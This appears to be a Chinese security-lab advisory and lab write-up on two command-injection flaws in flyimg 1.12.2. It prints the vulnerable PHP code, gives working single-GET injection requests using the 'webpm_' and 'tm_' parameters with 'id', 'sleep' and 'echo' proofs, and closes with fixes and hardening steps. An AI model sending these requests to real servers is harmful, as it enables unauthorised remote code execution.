#  【漏洞预警】flyimg 1.12.2 的两个RCE  
 YNsec安全实验室   2026-10-23 09:10  
  
# 一条 URL，一台服务器：flyimg 1.12.2 的两个命令注入点  
  
安全研究 · 漏洞利用链拆解 · 靶场实录  
  
摘要  
一个「只用来给图片改尺寸」的服务，为什么能执行系统命令？本文先讲清 flyimg 这套系统在做什么，再拆它的两个独立注入点——一个藏在 webp 压缩参数里，一个藏在视频截帧时间上，都是一条 GET 请求。  
  
**免责声明：**  
本文所述测试全部在授权靶场环境中完成，目标地址已脱敏（使用 RFC5737 文档专用地址段）。内容仅用于安全学习与防御加固，请勿用于任何未授权测试。  
## 一、先说系统：flyimg 是干什么的  
  
不讲清楚系统，后面的 payload 会显得很莫名其妙。所以先把靶子摆出来。  
  
**flyimg 是一个开源自托管的图片处理服务**  
，定位类似「自己搭一个图片 CDN」。你把图片地址塞进 URL，它就按照 URL 里的参数帮你裁剪、缩放、压缩、转格式，然后把处理好的图返回给你。很多站点用它做缩略图服务，避免在上传时就生成一堆尺寸。  
  
它的用法非常直接——**参数全部写在 URL 路径里**  
：  
  
基本用法  
  
  
/upload/{options}/{imageSrc}  
示例：/upload/w_200,h_200,c_1/https://example.com/a.jpg  
      └─ 把 a.jpg 裁成 200×200 返回  
  
  
options  
 这一段的语法是**逗号分隔多个选项，每个选项写成「键_值」**  
。看懂这张对照表，后面的 payload 就一目了然了：  
<table><thead><tr><th style="background: rgb(244, 247, 251);border: 1px solid rgb(227, 232, 239);padding: 9px 10px;text-align: left;font-weight: 700;color: rgb(31, 45, 61);"><section><span leaf="">选项</span></section></th><th style="background: rgb(244, 247, 251);border: 1px solid rgb(227, 232, 239);padding: 9px 10px;text-align: left;font-weight: 700;color: rgb(31, 45, 61);"><section><span leaf="">含义</span></section></th><th style="background: rgb(244, 247, 251);border: 1px solid rgb(227, 232, 239);padding: 9px 10px;text-align: left;font-weight: 700;color: rgb(31, 45, 61);"><section><span leaf="">本次相关</span></section></th></tr></thead><tbody><tr><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 10px;"><code style="background: rgb(240, 243, 247);color: rgb(199, 37, 78);border-radius: 3px;padding: 1px 4px;font-family: Consolas, monospace;font-size: 12px;"><span leaf="">w_200 / h_200</span></code></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 10px;"><section><span leaf="">宽 / 高</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 10px;"><section><span leaf="">—</span></section></td></tr><tr><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 10px;"><code style="background: rgb(240, 243, 247);color: rgb(199, 37, 78);border-radius: 3px;padding: 1px 4px;font-family: Consolas, monospace;font-size: 12px;"><span leaf="">c_1</span></code></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 10px;"><section><span leaf="">裁剪（crop）</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 10px;"><section><span leaf="">触发尺寸计算</span></section></td></tr><tr><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 10px;"><code style="background: rgb(240, 243, 247);color: rgb(199, 37, 78);border-radius: 3px;padding: 1px 4px;font-family: Consolas, monospace;font-size: 12px;"><span leaf="">o_webp</span></code></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 10px;"><section><span leaf="">输出为 webp 格式</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 10px;"><section><span leaf="">—</span></section></td></tr><tr><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 10px;"><code style="background: rgb(240, 243, 247);color: rgb(199, 37, 78);border-radius: 3px;padding: 1px 4px;font-family: Consolas, monospace;font-size: 12px;"><span leaf="">webpm_&lt;值&gt;</span></code></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 10px;"><section><span leaf="">webp 压缩算法参数</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 10px;"><strong><span leaf="">注入点一</span></strong></td></tr><tr><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 10px;"><code style="background: rgb(240, 243, 247);color: rgb(199, 37, 78);border-radius: 3px;padding: 1px 4px;font-family: Consolas, monospace;font-size: 12px;"><span leaf="">tm_&lt;值&gt;</span></code></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 10px;"><section><span leaf="">视频截帧时间点</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 10px;"><strong><span leaf="">注入点二</span></strong></td></tr></tbody></table>  
技术栈和部署形态：  
<table><thead><tr><th style="background: rgb(244, 247, 251);border: 1px solid rgb(227, 232, 239);padding: 9px 10px;text-align: left;font-weight: 700;color: rgb(31, 45, 61);"><section><span leaf="">层</span></section></th><th style="background: rgb(244, 247, 251);border: 1px solid rgb(227, 232, 239);padding: 9px 10px;text-align: left;font-weight: 700;color: rgb(31, 45, 61);"><section><span leaf="">本次靶标</span></section></th></tr></thead><tbody><tr><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 10px;font-weight: 600;"><section><span leaf="">应用</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 10px;"><section><span leaf="">flyimg 1.12.2（PHP + Symfony）</span></section></td></tr><tr><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 10px;font-weight: 600;"><section><span leaf="">Web</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 10px;"><section><span leaf="">nginx 1.24 / PHP 8.2.32</span></section></td></tr><tr><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 10px;font-weight: 600;"><section><span leaf="">命令行工具</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 10px;"><section><span leaf="">ImageMagick（convert / identify）、cwebp；ffmpeg 未安装</span></section></td></tr><tr><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 10px;font-weight: 600;"><section><span leaf="">运行用户</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 10px;"><section><span leaf="">nginx（uid=994）</span></section></td></tr></tbody></table>  
💡 **为什么这类系统天生高危？**  
三点叠加：① **它没有用户体系**  
，端点默认对所有人开放，「零权限」在这里是默认状态而不是配置失误；② **参数全在 URL 里**  
，等于把所有输入都摊开给攻击者；③ **它的活儿本来就是调外部程序**  
——PHP 里一调命令行，就必然经过 shell。这三点凑齐，注入点只要出现一个，就是 RCE。  
## 二、结论速览  
  
这两份报告针对的是**同一台靶标、同一个版本**  
，但找到的是**两个互相独立的注入点**  
。任何一个单独成立，都能直接拿到 shell。  
<table><thead><tr><th style="background: rgb(244, 247, 251);border: 1px solid rgb(227, 232, 239);padding: 9px 8px;text-align: left;font-weight: 700;color: rgb(31, 45, 61);"><section><span leaf="">对比项</span></section></th><th style="background: rgb(244, 247, 251);border: 1px solid rgb(227, 232, 239);padding: 9px 8px;text-align: left;font-weight: 700;color: rgb(31, 45, 61);"><section><span leaf="">VE-0001</span></section></th><th style="background: rgb(244, 247, 251);border: 1px solid rgb(227, 232, 239);padding: 9px 8px;text-align: left;font-weight: 700;color: rgb(31, 45, 61);"><section><span leaf="">VE-0005</span></section></th></tr></thead><tbody><tr><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;font-weight: 600;"><section><span leaf="">注入参数</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;"><code style="background: rgb(240, 243, 247);color: rgb(199, 37, 78);border-radius: 3px;padding: 1px 4px;font-family: Consolas, monospace;font-size: 11.5px;"><span leaf="">webpm_</span></code><section><span leaf="">（webp 压缩参数）</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;"><code style="background: rgb(240, 243, 247);color: rgb(199, 37, 78);border-radius: 3px;padding: 1px 4px;font-family: Consolas, monospace;font-size: 11.5px;"><span leaf="">tm_</span></code><section><span leaf="">（视频截帧时间）</span></section></td></tr><tr><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;font-weight: 600;"><section><span leaf="">Sink</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;"><code style="background: rgb(240, 243, 247);color: rgb(199, 37, 78);border-radius: 3px;padding: 1px 4px;font-family: Consolas, monospace;font-size: 11.5px;"><span leaf="">proc_open()</span></code><section><span leaf=""> 拼 ImageMagick 命令</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;"><code style="background: rgb(240, 243, 247);color: rgb(199, 37, 78);border-radius: 3px;padding: 1px 4px;font-family: Consolas, monospace;font-size: 11.5px;"><span leaf="">proc_open()</span></code><section><span leaf=""> + </span><code style="background: rgb(240, 243, 247);color: rgb(199, 37, 78);border-radius: 3px;padding: 1px 4px;font-family: Consolas, monospace;font-size: 11.5px;"><span leaf="">exec()</span></code><span leaf=""> 双 sink</span></section></td></tr><tr><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;font-weight: 600;"><section><span leaf="">需要的环境</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;"><section><span leaf="">cwebp 已安装</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;"><section><span leaf="">只需能传 video/* 数据（ffmpeg 装不装都行）</span></section></td></tr><tr><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;font-weight: 600;"><section><span leaf="">请求数</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;"><section><span leaf="">1 个 GET</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;"><section><span leaf="">1 个 GET</span></section></td></tr><tr><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;font-weight: 600;"><section><span leaf="">回显</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;"><section><span leaf="">写文件 → HTTP 取回</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;"><section><span leaf="">直接回显在 500 错误页</span></section></td></tr><tr><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;font-weight: 600;"><section><span leaf="">最终权限</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;"><section><span leaf="">nginx（uid=994）</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;"><section><span leaf="">nginx（uid=994）</span></section></td></tr><tr><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;font-weight: 600;"><section><span leaf="">CVSS 3.1</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;"><strong><span leaf="">9.8</span></strong></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;"><strong><span leaf="">9.8</span></strong></td></tr></tbody></table>## 三、注入点一：webp 压缩参数  
  
先说最「标准」的那一个。ImageProcessor::calculateQuality()  
 在拼 ImageMagick 命令时，把用户传来的 webpMethod  
 直接塞进了字符串：  
  
ImageProcessor.php · 命令拼接  
  
  
$parameter = "-quality {$quality}"  
    . " -define webp:thread-level={$webpThreads}"  
    . " -define webp:method={$webpMethod}"        // ← 未转义，直接拼接  
    . " -define webp:lossless={$lossLess}"  
    . " " . escapeshellarg($outputImage->getOutputTmpPath());  
  
  
注意**对比**  
：最后那个输出路径是用 escapeshellarg()  
 转义过的，而前面几个 webp:*  
 参数没有。写这段代码的人知道要转义，只是漏了几个——和上一篇那个「少了一行 checkAccess」是同一类失误。  
### 3.1 三个字符禁区和一次绕行  
  
这条链最有意思的不是漏洞本身，而是**你没法随便写 payload**  
。有三层限制卡着：  
<table><thead><tr><th style="background: rgb(244, 247, 251);border: 1px solid rgb(227, 232, 239);padding: 9px 8px;text-align: left;font-weight: 700;color: rgb(31, 45, 61);"><section><span leaf="">禁用</span></section></th><th style="background: rgb(244, 247, 251);border: 1px solid rgb(227, 232, 239);padding: 9px 8px;text-align: left;font-weight: 700;color: rgb(31, 45, 61);"><section><span leaf="">为什么</span></section></th><th style="background: rgb(244, 247, 251);border: 1px solid rgb(227, 232, 239);padding: 9px 8px;text-align: left;font-weight: 700;color: rgb(31, 45, 61);"><section><span leaf="">怎么办</span></section></th></tr></thead><tbody><tr><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;text-align: center;"><code style="background: rgb(240, 243, 247);color: rgb(199, 37, 78);border-radius: 3px;padding: 1px 4px;font-family: Consolas, monospace;font-size: 11.5px;"><span leaf="">_</span></code></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;"><section><span leaf="">选项解析用 </span><code style="background: rgb(240, 243, 247);color: rgb(199, 37, 78);border-radius: 3px;padding: 1px 4px;font-family: Consolas, monospace;font-size: 11.5px;"><span leaf="">explode(&#39;_&#39;)</span></code><span leaf=""> 拆键值，下划线会把命令截断</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;"><section><span leaf="">命令和文件名避开下划线</span></section></td></tr><tr><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;text-align: center;"><code style="background: rgb(240, 243, 247);color: rgb(199, 37, 78);border-radius: 3px;padding: 1px 4px;font-family: Consolas, monospace;font-size: 11.5px;"><span leaf="">/</span></code></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;"><section><span leaf="">URL 路由里的路径分隔符</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;"><section><span leaf="">只写当前目录（就是 web 根）</span></section></td></tr><tr><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;text-align: center;"><code style="background: rgb(240, 243, 247);color: rgb(199, 37, 78);border-radius: 3px;padding: 1px 4px;font-family: Consolas, monospace;font-size: 11.5px;"><span leaf="">;</span></code></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;"><section><span leaf="">Symfony 路由会把 </span><code style="background: rgb(240, 243, 247);color: rgb(199, 37, 78);border-radius: 3px;padding: 1px 4px;font-family: Consolas, monospace;font-size: 11.5px;"><span leaf="">;</span></code><span leaf=""> 当矩阵参数分隔符</span></section></td><td style="border: 1px solid rgb(227, 232, 239);padding: 9px 8px;"><strong><span leaf="">改用反引号或 </span><code style="background: rgb(240, 243, 247);color: rgb(199, 37, 78);border-radius: 3px;padding: 1px 4px;font-family: Consolas, monospace;font-size: 11.5px;"><span leaf="">$()</span></code></strong></td></tr></tbody></table>  
第三条是关键——命令分隔符用不了，那就换**命令替换**  
。反引号 `cmd`  
 在 shell 里等价于 $(cmd)  
，一样会被执行，但不碰路由的雷区：  
  
HTTP 请求（%60 是反引号）  
  
  
GET /upload/w_200,o_webp,webpm_%60id%3EVE0001id%60/<图片来源URL> HTTP/1.1  
Host: 192.0.2.70:8080  
  
  
解码之后，webpm_  
 的值就是 `id>VE0001id`  
 —— 服务器会先执行 id > VE0001id  
，再把输出替换回命令串。**结果就是 web 根目录下多了一个叫 VE0001id 的文件**  
，里面是 uid=994(nginx)...  
。  
  
回显也不是问题——文件落在 web 根，直接 HTTP 访问读回来就行：  
  
取证  
  
  
GET /VE0001id  
→ uid=994(nginx) gid=991(nginx) groups=991(nginx)  
GET /chainproof  
→ CHAINPROOF        ← 注入 echo 写入的唯一标记，非既有文件  
  
## 四、注入点二：视频截帧时间  
  
第二个点更隐蔽，因为它藏在一个「看起来只是个数字」的参数上。  
  
flyimg 支持处理视频：取视频的某一帧当封面图。tm_  
 就是「取第几秒的那一帧」。这个时间值被拿去拼 ffmpeg 命令——拼在**输出文件路径**  
上：  
  
VideoProcessor · 时间参数进了文件路径  
  
  
// $time 来自 tm_ 参数，只做了 str_replace(['.', ':'], '', $time)  
$videoSourceImagePath = $outputImage->getOutputTmpPath() . '-' . $time;  
// 然后作为参数丢进命令行 —— 首参数没有 escapeshellarg  
$cmd->addArgument($videoSourceImagePath);  
  
  
于是 tm_  
 传 ;id  
，输出路径就变成了 original-ed83...-;id  
。  
### 4.1 用一个 data URI 省掉「视频源」  
  
按理说处理视频得先有个视频。但这里不需要——**直接把 base64 的假 mp4 头塞进 URL**  
，MIME 检测看到 video/*  
 就会走视频分支：  
  
HTTP 请求  
  
  
GET /upload/tm_%3Bid,w_100,h_100,c_1/data:video/mp4;base64,AAAAFGZ0eXBtcDQyAAAAAG1wNDI= HTTP/1.1  
Host: 192.0.2.70:8080  
  
- tm_%3Bid  
 —— 解码为 ;id  
，注入的命令；  
  
- w_100,h_100,c_1  
 —— 触发尺寸计算，把流程带到第二个 sink；  
  
- data:video/mp4;base64,...  
 —— 自带假视频头，不用外网源。  
  
### 4.2 关键细节：为什么同一个 ;id，一处执行一处不执行  
  
这是整份报告里我最想让人看的一段。看它生成的实际命令：  
  
服务端拼出来的命令（节选）  
  
  
/usr/bin/ffmpeg -y -i '/tmp/original-ed83...' -vf scale='iw:ih' -ss ';id'  
  -f 'image2' -vframes '1' /tmp/original-ed83...-;id -hide_banner -loglevel 'error'  
① -ss ';id'              → 被单引号包住，整个值当参数，命令没执行  
② ...-;id                → 输出路径没有引号，shell 在这里切开  
  
  
同一个 ;id  
，被引号包住的那份是死的，没被包住的那份就活了。**这跟 payload 写得好不好无关，纯粹取决于它落在命令行的哪个位置、有没有被引号罩住。**  
——这也是为什么「同一个参数名换个 Sink 就打不动」这种事经常发生。  
  
⚠️ **更反直觉的是：ffmpeg 根本没装，照样能打。**  
 请求返回 500，错误信息里写着 sh: /usr/bin/ffmpeg: No such file or directory  
——因为 shell 是**先按 ; 拆成两条命令再逐条执行**  
的：第一条找不到程序、失败了，第二条 id  
 照跑不误。  
  
响应（500 页面里就是铁证）  
  
  
HTTP/1.1 500 Internal Server Error  
Error output: sh: /usr/bin/ffmpeg: No such file or directory  
id: invalid option -- 'h'  
Try 'id --help' for more information.  
  
  
id: invalid option -- 'h'  
 这行看着像个错误，其实是**最干净的证据**  
：id  
 确实被执行了，只是后面跟着的 -hide_banner -loglevel error  
 被当成它的参数，它不认，于是报错。**报错本身就是回显。**  
### 4.3 还有第二个 sink  
  
同一条请求里，后面 updateTargetDimensions()  
 会去读这个「刚生成的文件」的尺寸，走的是另一个函数：  
  
ImageMetaInfo.php · 第二个 sink  
  
  
exec(Processor::IM_IDENTITY_COMMAND . ' ' . $this->path() . ' 2>&1');  
// $this->path() 里带着 -;id，同样没转义 → id 再执行一次  
  
  
所以一条请求里，**命令被执行了两遍**  
。这也解释了为什么这条链连 ffmpeg 缺失都不怕——东边不亮西边亮。  
  
时序验证同样干净：  
  
sleep 时序  
  
  
GET .../tm_%3Bsleep%203%3B,w_100,h_100,c_1/data:video/mp4;base64,...  
→ 3007ms（基线 10–20ms）  
GET .../tm_%3Becho%20PROOF%3Eprooffile,...  
→ HTTP 取回 prooffile，内容 35 字节  
  
  
注意 sleep 3  
 后面为什么要再跟一个 ;  
——不闭合的话，后面那些 -hide_banner  
 会变成 sleep  
 的参数，直接报错不睡。  
## 五、两个注入点，同一类病根  
  
把两个点放在一起看，会发现它们的病根是同一个：**「参数是字符串拼接进命令行的」**  
。区别只在拼接的位置——一个在 -define webp:method=  
 后面，一个在输出文件路径后面。  
  
这也解释了一个常见误区：很多人以为「这个参数只是数字」「这个参数只是时间」，就不会有问题。但 shell 不看语义，**它只看引号和分隔符**  
。  
## 六、修复：从「补转义」到「不过 shell」  
  
第一步：把漏掉的转义补上（止血）  
  
三处改动  
  
  
// ① Command::addArgument() —— 首参数也要转义  
public function addArgument(string $argument, string $value = '')  
{  
    $argument = escapeshellarg($argument);          // 新增  
    if (!empty($value)) {  
        $argument .= ' ' . escapeshellarg($value);  
    }  
    $this->arguments[] = $argument;  
    return $this;  
}  
// ② ImageMetaInfo::imageImIdentify() —— exec 前转义路径  
$commandStr = Processor::IM_IDENTITY_COMMAND  
            . ' ' . escapeshellarg($this->path()) . ' 2>&1';  
// ③ VideoProcessor —— time 参数走白名单  
$tmpTime = preg_replace('/[^a-zA-Z0-9.:_-]/', '', $time);  
  
  
第二步：根本解法——别经过 shell  
  
proc_open()  
 支持**数组模式**  
，传参数数组而不是一整个字符串，操作系统直接 exec，压根没有 shell 参与，也就不存在「引号漏了」这种事：  
  
proc_open 数组模式  
  
  
proc_open(  
    ['/usr/bin/ffmpeg', '-y', '-i', $in, '-ss', $time, '-vframes', '1', $out],  
    $descriptors, $pipes  
);  
// 参数逐个传递，$time 里就算有 ; | $() 也只是普通字符串  
  
  
第三步：把这套服务关进笼子  
1. **打开签名校验**  
：配 security_key  
 与 security_iv  
。默认是空的，等于谁都能拼任意参数；  
  
1. **限制来源域名**  
：restricted_domains  
 + 白名单，默认同样是关的；  
  
1. **开限速**  
：rate_limit_enabled  
 默认 false，开着能挡自动化扫；  
  
1. **降权限 + 断外网**  
：nginx 用户不该能写 web 根；如果只做内网图片处理，出口方向就别让它出公网；  
  
1. **不需要视频功能就关掉**  
：tm_  
 这条链直接从入口上消失。  
  
💡 顺带提一个很典型的「写了都不用」：代码里其实定义了 EXCLUDED_IM_OPTIONS  
 常量，里面正好列着 webp-method  
 这类危险选项——**但这个常量在代码里从未被使用过**  
。安全设计做了一半，没接上线。  
## 写在最后  
1. **「功能单一」不等于「攻击面小」。**  
 一个只做图片压缩的服务，攻击面看起来就是「传个图、给个尺寸」。可它底下连着 ImageMagick、cwebp、ffmpeg，每一个都是命令执行入口。  
  
1. **转义要看位置，不能看参数名。**  
 同一个 ;id  
，在引号里是死字符串，在没引号的路径里就是命令分隔符。**payload 能不能打，取决于它落在哪。**  
  
1. **失败也能是证据。**  
 ffmpeg 没装、页面 500、命令报「invalid option」——这些「错误」反而是最硬的证明。反过来，看到 500 就以为「打不通」，是最常见的误判。  
  
1. **默认配置就是默认风险。**  
 签名关、域名白名单关、限速关，作者的本意是「开箱即用」，代价是把一道门留给了所有人。  
  
至于修复，**最好的那一步不是补转义，而是别让参数经过 shell**  
。转义是「记得住就安全」，数组传参是「想出错都难」。  
  
觉得有收获？  
  
点个「在看」和「赞」，顺手查一下你们有没有在跑图片处理服务 👇  
尤其那种「对公网开放、参数全在 URL 里」的。  
  
  
